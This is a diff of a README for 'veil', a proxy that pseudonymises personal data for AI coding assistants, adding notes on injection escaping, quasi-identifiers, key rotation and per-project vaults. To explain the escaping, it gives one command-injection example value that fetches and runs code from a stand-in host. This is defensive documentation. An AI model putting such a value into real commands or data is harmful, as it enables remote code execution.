@@ -69,8 +69,15 @@ of the regression suite. Two lessons came out of this work:
 
 **4. Real values can't become code.** Putting a real value back into a shell command turns data into
 code: a customer named `$(curl evil.sh|sh)`, or just `O'Brien`. veil escapes every restored value for
-its exact quoting context (unquoted, `'…'`, `"…"`, or an SQL literal inside a shell string). Of 35
-injection tests, **23 fail without this protection and all 35 pass with it.**
+each language layer it passes through:
+
+- shell quoting, heredocs and `$( )`;
+- code passed to `python -c` (including f-strings), `node -e`, `ruby`, `perl`, `php`, `jq`, `awk`,
+  SQL clients, and `bash -c` / `eval`, recursively.
+
+Where a value's output would itself become code (`… | sh`, `v=…; python3 -c "$v"`), only inert values
+are restored. Of 35 shell/SQL injection tests, **23 fail without this protection and all 35 pass with
+it**. A fuzzer has executed **50,000** randomly nested commands with hostile values: **0 ran any code**.
 
 **5. It never writes new PII into your code.** Edit and write tools only get back values that already
 exist in the target file. Web tools, unknown tools and network-capable commands (`curl`, `ssh`,
@@ -100,7 +107,12 @@ signals: Postgres write counters, MySQL table statistics, the Redis change count
 counters, file times. A customer added to the database while you work is pseudonymised on the next
 request. Re-seeding happens in the background; at 1.2M values the first request after it takes 0.11 s.
 
-**10. Proven on a real repository.** Setup: veil's own repository, 39,650 seeded values, Claude Code
+**10. It knows what else identifies people.** Birth dates, postal codes, cities, companies and job
+titles of your seeded people are tracked with how many records share them. Rare ones reaching the
+model are reported (kinds and counts only), or pseudonymised with `veil quasi redact`. SSNs, IBANs
+(checksum-validated), passports and tax IDs are always pseudonymised.
+
+**11. Proven on a real repository.** Setup: veil's own repository, 39,650 seeded values, Claude Code
 with a live model through veil. Task: add a feature and run the tests. The task succeeded, 0 real
 values leaked, 0 pseudonyms ended up in the code, and the only replacements were the developer's
 username and git name, so there were no false positives (`veil_dev.pilot`).
@@ -208,6 +220,14 @@ veil reveal notes.txt         # convert copied text: pseudonyms -> real values, 
 veil share bug-report.txt     # and back: real values -> pseudonyms, before you paste it anywhere
 ```
 
+Keys and isolation:
+
+```sh
+veil keys rotate                       # new vault key: everything re-encrypted, pseudonyms unchanged
+veil keys rotate --token-secret        # new pseudonyms; old ones still restore in open conversations
+VEIL_HOME=~/.veil-acme veil init ~/code/acme --port 8788   # a separate vault and proxy per project
+```
+
 ## Teams
 
 ```sh
@@ -252,7 +272,7 @@ received, and what the model replied.
 
 | Version | Date | Where | Notes |
 |---|---|---|---|
-| main | unreleased | this repository | Display modes (`veil display`, `reveal`, `share`, team-enforced pseudonyms), automatic re-seeding, scale to 1M+ seeded values, byte-cut truncation, CI with live databases. |
+| main | unreleased | this repository | Display modes (`veil display`, `reveal`, `share`, team-enforced pseudonyms), automatic re-seeding, scale to 1M+ seeded values, escaping for embedded languages (fuzzed), quasi-identifiers and direct identifiers, key rotation, per-project vaults, byte-cut truncation, CI with live databases. |
 | 0.1.2 | 2026-10-21 | [PyPI](https://pypi.org/project/veil-proxy/0.1.2/), [TestPyPI](https://test.pypi.org/project/veil-proxy/0.1.2/), [Homebrew tap](https://github.com/lemonadesaltbagel/homebrew-veil) | Same code as 0.1.1, built with a pure-Python backend (`flit_core`) so the source archive builds without a Rust toolchain; that is what Homebrew needs. The dev harness moved out of the package into `veil_dev/`. Verified with `brew install --build-from-source`, `brew test` and `brew audit --strict`. |
 | 0.1.1 | 2026-10-21 | [PyPI](https://pypi.org/project/veil-proxy/0.1.1/), [TestPyPI](https://test.pypi.org/project/veil-proxy/0.1.1/) | First PyPI release. The same files went to TestPyPI first as a final dry run, then to PyPI; both were verified byte-identical to the inspected build. |
 | 0.1.0 | 2026-10-20 | [TestPyPI](https://test.pypi.org/project/veil-proxy/0.1.0/) only | Packaging dry run: verified the runtime-only contents, a clean install from the index, and the console scripts. Never published to PyPI. |
@@ -275,8 +295,11 @@ veil is alpha software. We'd rather you know exactly where its edges are:
   the full name still is.
 - **Free text about third parties** needs the optional NER model (`veil-proxy[ner]`, then
   `veil ner-model fetch`).
-- **Re-identification.** Quasi-identifiers such as tenant names, rare values and timestamps can still
-  allow re-identification.
+- **Re-identification.** Rare birth dates, postal codes, cities, companies and job titles are reported
+  or pseudonymised. Other attributes (amounts, timestamps, free-text descriptions) and combinations
+  of common values can still allow re-identification.
+- **Code in unknown languages.** Values are escaped for sh, heredocs and the common interpreters.
+  A value written into a script file and run later gets no escaping beyond its file context.
 - **Cloud providers:** Bedrock and Vertex are verified with the real Claude Code CLI against faithful
   fake upstreams, not yet against live AWS or GCP accounts.
 
